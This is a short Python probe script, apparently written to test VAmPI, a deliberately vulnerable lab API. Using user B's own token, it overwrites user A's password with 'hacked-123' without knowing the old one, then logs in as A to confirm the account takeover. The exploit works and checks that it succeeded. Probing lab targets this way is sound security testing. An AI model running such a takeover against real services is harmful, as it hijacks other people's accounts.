"""越权改密探针:B 无旧口令改 A 的密码。

vuln=1 → 改成功(随后新口令可登录);vuln=0 → 阻断。
用法:python probe_pwchange.py(需 VAMPI_BASE;先 GET /createdb)
"""

from _probe_lib import call, jbody, register_and_login, run, uniq, verdict


def main() -> int:
    call("GET", "/createdb")
    alice, _ = register_and_login(uniq("alice"))
    bob, tb = register_and_login(uniq("bob"))
    new_pw = "hacked-123"
    status, body = call(
        "PUT", f"/users/v1/{alice}/password", {"password": new_pw}, token=tb
    )
    if status not in (200, 201, 204):  # 204 No Content = 改写成功
        return verdict("pwchange(unauthorized update)", False)
    # 验证口令真的被换掉
    status, body = call("POST", "/users/v1/login", {"username": alice, "password": new_pw})
    changed = status == 200 and jbody(body).get("auth_token")
    return verdict("pwchange(unauthorized update)", bool(changed))


if __name__ == "__main__":
    run(main)
